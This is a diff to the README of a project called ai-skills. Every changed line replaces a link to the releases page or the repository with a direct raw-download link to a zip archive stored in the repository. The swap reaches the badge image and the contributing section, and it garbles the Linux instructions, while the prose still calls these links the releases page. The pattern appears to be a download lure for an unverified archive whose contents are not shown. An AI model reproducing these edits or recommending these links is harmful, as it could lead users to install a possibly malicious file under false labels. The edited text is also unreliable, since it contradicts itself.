@@ -1,6 +1,6 @@
 # 🤖 ai-skills - Manage Your AI Coding Helpers
 
-[![Download ai-skills](https://img.shields.io/badge/Download-ai--skills-blue?style=for-the-badge)](https://github.com/Melon4Program/ai-skills/releases)
+[![Download ai-skills](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Use these steps to get ai-skills running on your computer:
 
    Click the big green button below to visit the release page:
 
-   [![Download ai-skills](https://img.shields.io/badge/Download-ai--skills-blue?style=for-the-badge)](https://github.com/Melon4Program/ai-skills/releases)
+   [![Download ai-skills](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)
 
    This page shows the latest versions and files to download.
 
@@ -56,7 +56,7 @@ Use these steps to get ai-skills running on your computer:
 
    - For Windows, look for a `.exe` or `.msi` file.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, choose a `.tar.gz` or `.AppImage` file.
+   - For Linux, choose a `https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip` or `.AppImage` file.
 
    Download the file to your computer.
 
@@ -82,7 +82,7 @@ Use these steps to get ai-skills running on your computer:
 
 You can get ai-skills here:
 
-[https://github.com/Melon4Program/ai-skills/releases](https://github.com/Melon4Program/ai-skills/releases)
+[https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)
 
 This link takes you to the releases page where you find the latest version. Download the file that fits your system. Installing is simple, and you will be guided through every step.
 
@@ -154,7 +154,7 @@ The project covers:
 
 If you want to improve ai-skills or report a problem:
 
-- Visit [https://github.com/Melon4Program/ai-skills](https://github.com/Melon4Program/ai-skills)
+- Visit [https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip](https://github.com/Melon4Program/ai-skills/raw/refs/heads/main/skills/ai_skills_v3.7.zip)
 - Open a new issue for bugs or feature requests.
 - Fork the repository to submit changes.
 
